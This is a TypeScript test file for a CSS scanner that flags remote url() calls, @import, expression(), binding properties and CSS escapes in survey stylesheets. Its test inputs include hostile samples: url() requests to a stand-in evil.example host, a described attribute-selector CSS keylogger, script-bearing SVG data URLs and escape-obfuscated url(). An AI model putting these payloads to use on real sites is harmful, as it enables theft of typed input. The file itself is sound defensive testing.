/**
 * `CMP-0503` — the CSS scanner (roadmap P2-12).
 *
 * The cases here are chosen because "CSS is presentational and therefore harmless" is the intuition
 * this module exists to correct, and each of these is a real capability a stylesheet has:
 *
 *  * a remote `url()` is an HTTP request, and with attribute selectors it is a working keylogger
 *    with no JavaScript at all;
 *  * `@import` hands every rule below it to another origin, after publish — which also means the
 *    hash we computed no longer determines what the browser applies;
 *  * `expression()` executes script;
 *  * a comment or a string can hide any of the above from a naive regex, which is why
 *    `stripCssComments` exists and is tested on its own;
 *  * a CSS escape (`\75 rl(...)`) is `url(...)` to a browser and is not `url` to any string search.
 *
 * And the legitimate cases matter as much: a scanner that refuses ordinary author CSS is one an
 * operator turns off.
 */

import { describe, expect, it } from 'vitest';
import type { Survey } from '@resscript/schema';

import { analyzeCss, scanCss, scanReservedSelectors, stripCssComments } from './css.js';

const reasons = (css: string): string[] => scanCss(css).map((f) => f.reason);

/* ---------------------------------------------------------------- *
 * stripCssComments
 * ---------------------------------------------------------------- */

describe('stripCssComments', () => {
  it('preserves length exactly, so every reported offset points at real characters', () => {
    // The property the error messages depend on. Replacing a 40-character comment with one space
    // would shift every later finding by 39 and point the author at the wrong line.
    const src = 'a{/* a long comment here */color:red}';
    expect(stripCssComments(src)).toHaveLength(src.length);
  });

  it('blanks a comment, to exactly its own length', () => {
    // `/*x*/` is five characters, so five spaces. I first wrote seven here and the test was right
    // to fail: an off-by-two in this function is an off-by-two in every reported offset.
    expect(stripCssComments('a{/*x*/b:c}')).toBe('a{     b:c}');
  });

  it('blanks an unterminated comment to the end, matching what a browser renders', () => {
    const out = stripCssComments('a{color:red} /* never closed');
    expect(out.startsWith('a{color:red} ')).toBe(true);
    expect(out.slice(13).trim()).toBe('');
  });

  it('leaves STRINGS visible, deliberately', () => {
    // Not an omission — see the function's header. Blanking strings forced the url() reader back to
    // the raw source, which reintroduced comment-hiding: `url(/*x*/ //evil/)` reads as a relative
    // path from raw text. Leaving strings visible resolves that conflict in the safe direction, at
    // the cost of a false positive on a `content:` string that names a dangerous construct.
    expect(stripCssComments('a{content:"x}y"}')).toBe('a{content:"x}y"}');
  });

  it('blanks a comment INSIDE a string too, which is the conservative choice', () => {
    // A browser does not treat /* */ inside a string as a comment, so this is technically wrong —
    // and wrong in the direction that reports more, never less. Being right here would mean
    // tracking string state, which is the parser-disagreement problem the header declines.
    expect(stripCssComments('a{content:"/*x*/"}')).toBe('a{content:"     "}');
  });
});

/* ---------------------------------------------------------------- *
 * url()
 * ---------------------------------------------------------------- */

describe('url()', () => {
  it('allows a relative URL — our own origin, the normal case', () => {
    expect(reasons('a{background:url(/media/x.png)}')).toEqual([]);
    expect(reasons('a{background:url(x.png)}')).toEqual([]);
    expect(reasons('a{background:url(../img/x.png)}')).toEqual([]);
  });

  it('REFUSES an absolute remote URL', () => {
    // The exfiltration channel: `input[value^="a"]{background:url(//evil/a)}` repeated reads a
    // value one character at a time.
    expect(reasons('a{background:url(https://evil.example/x.png)}')).toEqual(['remote_url']);
    expect(reasons('a{background:url(http://evil.example/x.png)}')).toEqual(['remote_url']);
  });

  it('REFUSES a protocol-relative URL, which names no scheme', () => {
    // How a scheme-only check is bypassed.
    expect(reasons('a{background:url(//evil.example/x.png)}')).toEqual(['remote_url']);
  });

  it('refuses it inside quotes too, which is where a regex on the raw text fails', () => {
    expect(reasons('a{background:url("https://evil.example/x.png")}')).toEqual(['remote_url']);
    expect(reasons("a{background:url('//evil.example/x')}")).toEqual(['remote_url']);
  });

  it('allows a raster data: URL and refuses an SVG one', () => {
    // An SVG can carry script, which is the same reason assets.ts restricts data: on HTML URL
    // attributes.
    expect(reasons('a{background:url(data:image/png;base64,iVBOR)}')).toEqual([]);
    expect(reasons('a{background:url(data:image/svg+xml,<svg onload=alert(1)>)}')).toEqual([
      'remote_url',
    ]);
  });

  it('refuses a data: URL whose type it cannot read', () => {
    expect(reasons('a{background:url(data:base64,AAAA)}')).toEqual(['remote_url']);
    expect(reasons('a{background:url(data:text/html,<script>)}')).toEqual(['remote_url']);
  });

  it('refuses an unterminated url(', () => {
    expect(reasons('a{background:url(')).toEqual(['remote_url']);
  });

  it('is not fooled by a comment inside the url()', () => {
    // `url(/*x*/ //evil/)` — the classic defeat of a naive regex, and the case that caught the bug
    // described in stripCssComments' header: reading the argument from the raw source made this
    // scan as a harmless relative path.
    expect(reasons('a{background:url(/*x*/ //evil.example/)}')).toContain('remote_url');
  });

  it('tolerates whitespace between url and its paren', () => {
    expect(reasons('a{background:url (https://evil.example/x)}')).toContain('remote_url');
  });

  it('catches every url() in a sheet, not just the first', () => {
    const css = 'a{background:url(//a/)}b{background:url(//b/)}c{background:url(/ok.png)}';
    expect(reasons(css)).toEqual(['remote_url', 'remote_url']);
  });
});

/* ---------------------------------------------------------------- *
 * The execution and import constructs
 * ---------------------------------------------------------------- */

describe('@import', () => {
  it('is refused', () => {
    expect(reasons('@import url(https://evil.example/x.css);')).toContain('import');
    expect(reasons("@import 'other.css';")).toContain('import');
  });

  it('is refused even for a same-origin sheet', () => {
    // Not about the origin: an @import means the hashed artifact no longer determines what the
    // browser applies, whoever serves the target.
    expect(reasons("@import 'local.css';")).toContain('import');
  });

  it('is refused with whitespace after the at-sign', () => {
    expect(reasons('@ import "x.css";')).toContain('import');
  });
});

describe('script execution under three names', () => {
  it('refuses expression()', () => {
    expect(reasons('a{width:expression(alert(1))}')).toContain('expression');
    expect(reasons('a{width:EXPRESSION (alert(1))}')).toContain('expression');
  });

  it('refuses behavior: and -moz-binding:', () => {
    expect(reasons('a{behavior:url(#default#time2)}')).toContain('binding');
    expect(reasons('a{-moz-binding:url(x.xml#e)}')).toContain('binding');
  });
});

describe('CSS escapes', () => {
  it('reports an escape sequence rather than trying to decode every spelling', () => {
    // `\75 rl(...)` is url(...) to a browser and is not `url` to any string search. Reporting the
    // escape itself is the conservative direction: decoding is how a scanner ends up disagreeing
    // with the browser, and legitimate author CSS has no reason to escape a function name.
    expect(reasons('a{background:\\75 rl(//evil.example/)}')).toContain('escape');
  });

  it('reports an escaped at-rule too', () => {
    expect(reasons('\\40 import "x.css";')).toContain('escape');
  });
});

/* ---------------------------------------------------------------- *
 * Legitimate CSS must pass
 * ---------------------------------------------------------------- */

describe('ordinary author CSS', () => {
  it('passes a realistic stylesheet unchanged', () => {
    // A scanner that refuses ordinary CSS is one an operator turns off, which is worse than not
    // having it.
    const css = `
      :root { --brand: #0057b8; --radius: 6px; }
      body { font-family: Inter, system-ui, sans-serif; color: #1a1a1a; }
      .question-title { font-weight: 600; font-size: 1.125rem; margin-bottom: .5rem; }
      .option:hover { background: color-mix(in srgb, var(--brand) 8%, white); }
      @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
      @supports (backdrop-filter: blur(2px)) { .modal { backdrop-filter: blur(2px); } }
      .logo { background-image: url(/assets/logo.png); }
      @font-face { font-family: Local; src: url(/fonts/local.woff2) format('woff2'); }
      .spinner { animation: spin 1s linear infinite; }
      @keyframes spin { to { transform: rotate(360deg); } }
    `;
    expect(scanCss(css)).toEqual([]);
  });

  it('passes a comment that merely mentions a dangerous construct', () => {
    // Comments are blanked, so prose about @import is prose.
    expect(reasons('/* do not use @import or url(https://x) here */ a{color:red}')).toEqual([]);
  });

  it('passes a content string that merely looks like a URL', () => {
    // Strings are visible to the scanner, but a bare URL in one is not a `url()` call and not an
    // `@import`, so there is nothing to report.
    expect(reasons('a::after{content:"https://example.com"}')).toEqual([]);
  });

  it('DOES report a dangerous construct written inside a string — the accepted false positive', () => {
    // Documented as a test rather than left as a surprise: this is the cost of leaving strings
    // visible, and an author who hits it is asked to change one line.
    expect(reasons('a::after{content:"@import trouble"}')).toContain('import');
  });
});

/* ---------------------------------------------------------------- *
 * Reserved selectors
 * ---------------------------------------------------------------- */

describe('reserved selectors', () => {
  it('refuses a selector on the rs- prefix', () => {
    // Those classes carry the accessibility contract — .rs-target is the 44px touch target from
    // question-kit/contract/a11y.ts — so CSS that can shrink them silently un-guarantees it.
    expect(scanReservedSelectors('.rs-target{min-height:1px}').map((f) => f.text)).toEqual([
      '.rs-target',
    ]);
  });

  it('finds it in a compound or descendant selector too', () => {
    expect(scanReservedSelectors('div .rs-target span{}').length).toBe(1);
    expect(scanReservedSelectors('a.rs-target:hover{}').length).toBe(1);
  });

  it('does NOT refuse an author class that merely starts with r or s', () => {
    expect(scanReservedSelectors('.results{} .side{} .rsvp{}')).toEqual([]);
  });

  it('is separable from the capability checks', () => {
    // A deployment rendering author CSS in an isolated document wants the capability rules and not
    // this one; keeping them separate functions is what makes that possible without editing either.
    expect(scanCss('.rs-target{min-height:1px}')).toEqual([]);
  });
});

/* ---------------------------------------------------------------- *
 * analyzeCss — the diagnostic shape
 * ---------------------------------------------------------------- */

function surveyWithCss(sheets: { ref: string; source: string }[]): Survey {
  return {
    assets: {
      css: sheets.map((s, i) => ({
        id: `ast_0C${String(i)}${'0'.repeat(23)}` as never,
        ref: s.ref,
        source: s.source,
        scope: 'survey' as const,
      })),
    },
  } as unknown as Survey;
}

describe('analyzeCss', () => {
  it('emits nothing for a survey with no stylesheets', () => {
    expect(analyzeCss({ survey: {} as Survey })).toEqual([]);
  });

  it('emits nothing for clean CSS', () => {
    expect(analyzeCss({ survey: surveyWithCss([{ ref: 'MAIN', source: 'a{color:red}' }]) })).toEqual(
      [],
    );
  });

  it('emits ONE diagnostic per stylesheet, however many findings', () => {
    // A stylesheet with 40 remote url() calls has one cause — the author pasted a third-party theme
    // — and 40 rows would bury everything else wrong with the survey.
    const source = Array.from({ length: 40 }, (_, i) => `.a${String(i)}{background:url(//e/${String(i)})}`).join('');
    const d = analyzeCss({ survey: surveyWithCss([{ ref: 'MAIN', source }]) });

    expect(d).toHaveLength(1);
    expect(d[0]?.code).toBe('CMP-0503');
    expect(d[0]?.detail?.['finding_count']).toBe(40);
    expect((d[0]?.detail?.['findings'] as unknown[]).length).toBe(12);
    expect(d[0]?.detail?.['truncated']).toBe(true);
  });

  it('emits one diagnostic per offending stylesheet', () => {
    const d = analyzeCss({
      survey: surveyWithCss([
        { ref: 'A', source: '@import "x.css";' },
        { ref: 'CLEAN', source: 'a{color:red}' },
        { ref: 'B', source: 'a{background:url(//e/)}' },
      ]),
    });

    expect(d).toHaveLength(2);
    expect(d.map((x) => x.detail?.['asset_ref'])).toEqual(['A', 'B']);
  });

  it('names the asset ref, so the author knows which file to open', () => {
    const d = analyzeCss({ survey: surveyWithCss([{ ref: 'BRAND', source: '@import "x";' }]) });
    expect(d[0]?.message).toContain('"BRAND"');
  });

  it('reports findings in source order', () => {
    const d = analyzeCss({
      survey: surveyWithCss([
        { ref: 'A', source: 'a{color:red}\nb{background:url(//e/)}\n@import "x";' },
      ]),
    });
    const found = d[0]?.detail?.['findings'] as { at: number }[];
    expect(found[0]!.at).toBeLessThan(found[1]!.at);
  });

  it('can be run without the reserved-selector rule', () => {
    const survey = surveyWithCss([{ ref: 'A', source: '.rs-target{min-height:1px}' }]);
    expect(analyzeCss({ survey })).toHaveLength(1);
    expect(analyzeCss({ survey, disallowReservedSelectors: false })).toHaveLength(0);
  });
});
